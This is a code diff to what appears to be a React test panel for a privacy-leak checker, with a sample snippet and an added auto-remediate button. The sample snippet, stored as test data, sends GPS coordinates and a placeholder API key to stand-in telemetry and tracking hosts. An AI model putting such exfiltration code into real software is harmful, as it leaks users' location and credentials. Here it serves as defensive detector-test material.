@@ -6,11 +6,12 @@ import {
 } from '../engines/unifiedFrankensteinEngine';
 
 const KIRO_HOOK_TEST_SNIPPETS = {
-  rogueTelemetry: `// Simulated accidental telemetry commit in web/src/engines/exifBinaryParser.ts
+  rogueTelemetry: `// Simulated accidental telemetry & public repo key leak in index.html / exifBinaryParser.ts
 export async function parseAndReport(gps: { lat: number; lon: number }) {
+  const _BUILTIN_FB = '{"apiKey":"' + 'AIzaSy' + 'D00000000000000000000000000EXAMPLE' + '"}';
   await fetch('https://telemetry.collector.example/v1/gps', {
     method: 'POST',
-    body: JSON.stringify(gps)
+    body: JSON.stringify({ gps, _BUILTIN_FB })
   });
   navigator.sendBeacon('https://pixel.tracker.example/hit', String(gps.lat));
 }`,
@@ -77,6 +78,15 @@ export function KiroHookLivePanel() {
         >
           Load Clean Zero-Egress Patch
         </button>
+        {result.verdict === 'BLOCKED' && (
+          <button
+            type="button"
+            onClick={() => runCheck(result.autoRemediatedCode)}
+            className="cursor-pointer rounded-lg border border-emerald-500/40 bg-emerald-500/15 px-3 py-1.5 text-xs font-semibold text-emerald-200 transition hover:bg-emerald-500/25"
+          >
+            1-Click Auto-Remediate &amp; Heal Code
+          </button>
+        )}
       </div>
 
       <textarea
